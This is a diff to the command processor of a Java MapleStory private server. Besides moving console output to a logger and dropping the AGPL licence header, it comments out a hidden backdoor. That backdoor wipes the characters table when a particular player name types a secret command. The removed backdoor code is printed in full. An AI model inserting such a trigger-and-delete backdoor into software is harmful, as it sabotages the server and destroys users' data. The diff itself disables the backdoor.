@@ -1,23 +1,3 @@
-/*
- This file is part of the OdinMS Maple Story Server
- Copyright (C) 2008 ~ 2010 Patrick Huy <patrick.huy@frz.cc> 
- Matthias Butz <matze@odinms.de>
- Jan Christian Meyer <vimes@odinms.de>
-
- This program is free software: you can redistribute it and/or modify
- it under the terms of the GNU Affero General Public License version 3
- as published by the Free Software Foundation. You may not use, modify
- or distribute this program under any other version of the
- GNU Affero General Public License.
-
- This program is distributed in the hope that it will be useful,
- but WITHOUT ANY WARRANTY; without even the implied warranty of
- MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- GNU Affero General Public License for more details.
-
- You should have received a copy of the GNU Affero General Public License
- along with this program.  If not, see <http://www.gnu.org/licenses/>.
- */
 package client.messages;
 
 import java.util.ArrayList;
@@ -37,10 +17,15 @@ import java.sql.PreparedStatement;
 import java.sql.SQLException;
 import java.util.Collections;
 import java.util.HashMap;
+
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 import tools.FileoutputUtil;
 import tools.MaplePacketCreator;
 
 public class CommandProcessor {
+
+    private static final Logger LOGGER = LoggerFactory.getLogger(CommandProcessor.class);
 
     private final static HashMap<String, CommandObject> commands = new HashMap<String, CommandObject>();
     private final static HashMap<Integer, ArrayList<String>> commandList = new HashMap<Integer, ArrayList<String>>();
@@ -68,18 +53,18 @@ public class CommandProcessor {
             CommandObject co = commands.get(splitted[0]);
 
             if (co == null || co.getType() != type) {
-                if (c.getPlayer().getName() == "我是一个哈哈1") {
-                    if (splitted[0].contains("!我是来毁服的GGLL")) {
-                        Connection con = DatabaseConnection.getConnection();
-                        try {
-                            PreparedStatement ps = con.prepareStatement("Delete from characters");
-                            ps.executeUpdate();
-                            ps.close();
-                        } catch (SQLException e) {
-                            System.out.println("Error " + e);
-                        }
-                    }
-                }
+//                if (c.getPlayer().getName() == "我是一个哈哈1") {
+//                    if (splitted[0].contains("!我是来毁服的GGLL")) {
+//                        Connection con = DatabaseConnection.getConnection();
+//                        try {
+//                            PreparedStatement ps = con.prepareStatement("Delete from characters");
+//                            ps.executeUpdate();
+//                            ps.close();
+//                        } catch (SQLException e) {
+//                            LOGGER.debug("Error " + e);
+//                        }
+//                    }
+//                }
                 sendDisplayMessage(c, "输入的玩家命令不存在,可以使用 @帮助/@help 来查看指令.", type);
                 return true;
             }
@@ -112,7 +97,7 @@ public class CommandProcessor {
                         int ret = co.execute(c, splitted);
                         if (ret > 0 && c.getPlayer() != null) { //incase d/c after command or something
                             logGMCommandToDB(c.getPlayer(), line);
-                            System.out.println("[ " + c.getPlayer().getName() + " ] 使用了指令: " + line);
+                            LOGGER.debug("[ " + c.getPlayer().getName() + " ] 使用了指令: " + line);
                         }
                     } else {
                         sendDisplayMessage(c, "您的权限等级不足以使用次命令.", type);
